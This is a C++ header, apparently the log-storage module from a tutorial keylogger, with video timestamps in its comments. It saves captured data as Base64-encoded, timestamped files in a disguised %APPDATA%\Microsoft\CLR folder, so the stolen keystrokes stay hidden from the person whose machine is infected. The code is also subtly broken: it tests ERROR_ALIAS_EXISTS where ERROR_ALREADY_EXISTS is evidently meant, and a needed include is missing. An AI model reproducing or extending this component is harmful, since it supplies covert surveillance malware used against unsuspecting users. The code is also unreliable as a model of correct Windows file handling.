#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO
{
	std::string GetOurPath(const bool append_seperator = false) 	// 8 mins
	{
        	std::string appdata_dir(getenv("APPDATA"));         	// 9:10 mins
        	std::string full = appdata_dir + "\\Microsoft\\CLR";   // 10 mins
        	return full + (append_seperator ? "\\" : "");       	// 10:55 mins
	}

	bool MkOneDr(std::string path)                              	// 14:30
	{
    	return (bool)CreateDirectory(path.c_str(), NULL) ||
    	GetLastError() == ERROR_ALIAS_EXISTS;
	}
	                                                          	// End Of IO.H part 1
	bool MKDir(std::string path)                                	// start of part 2 - 5:10 mins
	{
    	for(char &c : path)
        	if(c =='\\')
    	{
        	c='\0';
        	if(!MkOneDr(path))
            	return false;
        	c = '\\';
    	}
    	return true;
	}
	template <class T>                                          	// 12:30 min
	std::string WriteLog(const T &t)
	{
    	std::string path = GetOurPath(true);
    	Helper::DateTime dt;
    	std::string name = dt.GetDateTimeString("_") + ".log:";

    	try                                                     	// 13:50 mins
    	{
        	std::ofstream file(path + name);
        	if(!file) return "";
        	std::ostringstream s;
        	s << "[" << dt.GetDateTimeString() << "]" <<
        	std::endl << t << std::endl;
        	std::string data = Base64::EncryptB64(s.str());
        	file << data;
        	if(!file)
            	return "";
        	file.close();
        	return name;
    	}
    	catch(...)
    	{
        	return "";
    	}
	}
}
#endif // IO_H

